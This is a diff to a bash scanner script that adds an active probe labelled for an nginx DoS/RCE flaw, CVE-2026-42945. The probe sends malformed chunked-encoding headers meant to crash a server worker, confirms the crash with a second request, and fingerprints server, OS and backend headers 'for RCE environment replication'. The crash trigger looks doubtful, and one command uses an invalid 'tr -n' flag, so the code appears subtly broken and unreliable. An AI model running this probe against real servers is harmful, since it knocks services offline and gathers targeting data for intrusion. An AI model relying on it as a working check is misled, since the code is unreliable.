@@ -928,6 +928,61 @@ check_ENV_EXPOSED() {
     
     return 0
 }
+
+
+#############################################################################
+# 32. NGINX DoS/RCE (CVE-2026-42945)
+# Active-only heuristic probe. Triggers worker crash via malformed chunked 
+# encoding. Extracts target metadata for RCE environment replication.
+#############################################################################
+check_NGINX_CVE_2026_42945() {
+    local url=$1 domain=$2
+    _tz_reset_hit
+    
+    # Берем базовый URL без параметров
+    local base_url="${url%%\?*}"
+
+    # АКТИВНЫЙ ВЕКТОР (Heuristic Crash Probe)
+    # Отправляем искаженный заголовок. Если Nginx уязвим, процесс-воркер упадет.
+    local probe_status
+    probe_status=$(curl -s -k -o /dev/null -w "%{http_code}" \
+        -H "Connection: Keep-Alive" \
+        -H "Transfer-Encoding: chunked" \
+        -H "X-Nginx-Exploit-Test: %00%00%00%00" \
+        --max-time 5 \
+        "$base_url")
+
+    # Если мы получили ошибку бэкенда (502, 500) или разрыв соединения (000)
+    if [ "$probe_status" = "502" ] || [ "$probe_status" = "500" ] || [ "$probe_status" = "000" ]; then
+        
+        # КОНТРОЛЬНЫЙ ЗАПРОС (Проверка доступности)
+        local headers
+        headers=$(curl -s -k -I --max-time 5 "$base_url")
+        local control_status
+        control_status=$(echo "$headers" | head -n 1 | awk '{print $2}')
+        
+        # Если без пейлоада сервер отдает 200/301/400/403, значит упал именно один воркер!
+        if [[ "$control_status" =~ ^[234] ]]; then
+            
+            # СБОР МЕТАДАННЫХ (Target Fingerprinting)
+            local srv_header os_info backend_info
+            
+            srv_header=$(echo "$headers" | grep -iE '^Server:' | tr -d '\r\n')
+            os_info=$(echo "$srv_header" | grep -oE '\([^)]+\)')
+            [ -z "$os_info" ] && os_info="(OS Hidden)"
+            
+            backend_info=$(echo "$headers" | grep -iE '^(X-Powered-By|Via|X-Backend):' | tr -n '\r\n' ' | ' | sed 's/ | $//')
+            [ -z "$backend_info" ] && backend_info="Backend Hidden"
+
+            TZ_HIT_POC="$base_url  [Payload: Transfer-Encoding anomaly]"
+            TZ_HIT_PROOF="CVE-2026-42945 Verified (Crash $probe_status). Lab Target: [${srv_header}] ${os_info} | Env: [${backend_info}]"
+            return 1
+        fi
+    fi
+
+    return 0
+}
+
 #############################################################################
 # Asset-type filter — classifies URLs as "static asset" vs "dynamic".
 # Static assets (.js/.css/.png/etc.) only get header-based checks; injection
